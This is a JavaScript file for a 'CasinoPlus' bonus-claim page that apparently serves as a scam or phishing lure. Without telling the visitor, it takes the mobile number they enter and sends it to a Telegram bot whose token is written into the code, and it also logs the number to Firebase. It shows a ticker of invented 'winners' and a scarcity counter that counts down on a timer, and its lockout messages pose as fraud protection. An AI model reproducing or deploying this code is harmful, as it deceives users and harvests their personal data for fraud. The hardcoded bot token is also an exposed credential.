/**
 * CasinoPlus Index Page - Main Logic
 */

// Firebase reference
let db = null;

// Telegram config
const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
const chatId = '7298607329';

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
db = firebase.database();

// Scarcity counter
let count = 88;

// DOM Elements
const winnerEntry = document.getElementById('winnerEntry');
const remNum = document.getElementById('remNum');
const pBar = document.getElementById('pBar');
const modalOverlay = document.getElementById('modalOverlay');
const mainCard = document.getElementById('mainCard');
const userPhoneInput = document.getElementById('userPhone');
const claimBtn = document.getElementById('claimBtn');

// Show blocked UI (claimed or banned)
function showBlockedUI(reason = "claimed") {
    const overlay = document.getElementById('modalOverlay');
    overlay.style.display = 'flex';
    
    let blockMessage = "⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.";
    let title = "RESTRICTED";
    
    if (reason === "banned") {
        title = "TERMINATED";
        blockMessage = "⚠️ ACCESS_DENIED: This number or device is already detected to have a successful payout.";
    }

    document.getElementById('modalBodyContent').innerHTML = `
        <h2 style="color: #ff4d4d; margin-bottom: 15px;">${title}</h2>
        <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">${blockMessage}</p>
        <div style="font-size: 50px; margin: 20px 0;">🚫</div>
        <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff; box-shadow: none; animation: none;" onclick="location.reload()">Device Locked</button>
    `;
    mainCard.style.opacity = "0.2";
    mainCard.style.pointerEvents = "none";
}

// Handle verify button click
window.handleVerify = function() {
    if (localStorage.getItem("cp_device_locked") === "true") return showBlockedUI();
    const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
    if (!window.location.hash.includes("verified")) {
        window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
    } else {
        modalOverlay.style.display = 'flex';
    }
};

// Process phone number and redirect to main
window.processStep1 = async function() {
    const phone = userPhoneInput.value.trim();
    const btn = claimBtn;

    if (phone.length < 11 || !phone.startsWith('09')) {
        alert("Enter valid 11-digit number.");
        return;
    }
    
    btn.disabled = true; 
    btn.innerHTML = "CHECKING SECURE STATUS...";

    db.ref('banned_ghosts/' + phone).once('value', async (banSnap) => {
        if (banSnap.exists()) {
            localStorage.setItem("cp_device_locked", "true");
            showBlockedUI("banned");
            return;
        }

        db.ref('user_logs/' + phone).once('value', async (snapshot) => {
            const userData = snapshot.val();

            if (userData && userData.status === 'claimed') {
                localStorage.setItem("cp_device_locked", "true");
                showBlockedUI();
                return;
            }

            const blockedList = window.BLACKLISTED_NUMBERS || [];
            if (blockedList.includes(phone)) {
                localStorage.setItem("cp_device_locked", "true");
                showBlockedUI();
                return;
            }

            db.ref('user_sessions/' + phone).once('value', s => {
                if(!s.exists()) {
                    db.ref('user_sessions/' + phone).set({
                        phone: phone,
                        balance: 0,
                        clicks: 0,
                        hasShared: false,
                        lastUpdate: Date.now()
                    });
                } else {
                    db.ref('user_sessions/' + phone).update({ lastUpdate: Date.now() });
                }
            });

            try {
                localStorage.setItem("userPhone", phone);
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
                localStorage.setItem("cp_verified", "true");
                btn.innerHTML = "SUCCESS...";
                setTimeout(() => { window.location.href = "main.html"; }, 1000);
            } catch (e) {
                localStorage.setItem("userPhone", phone);
                localStorage.setItem("cp_verified", "true");
                window.location.href = "main.html";
            }
        });
    });
};

// Live winners ticker
function startTicker() {
    setInterval(() => {
        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
        const amounts = [350, 500, 750, 1000, 1200];
        const amount = amounts[Math.floor(Math.random() * amounts.length)];
        if (winnerEntry) {
            winnerEntry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amount}`;
        }
    }, 3500);
}

// Scarcity counter (diminishing bonuses)
function startScarcityCounter() {
    setInterval(() => {
        if (count > 15) {
            count -= Math.floor(Math.random() * 2) + 1;
            if (remNum) remNum.innerText = count + "/100";
            if (pBar) pBar.style.width = count + "%";
        }
    }, 5000);
}

// Check device lock on load
window.onload = () => {
    if (localStorage.getItem("cp_device_locked") === "true") {
        showBlockedUI();
    } else if (window.location.hash.includes("verified")) {
        modalOverlay.style.display = 'flex';
    }
};

// Initialize all
startTicker();
startScarcityCounter();
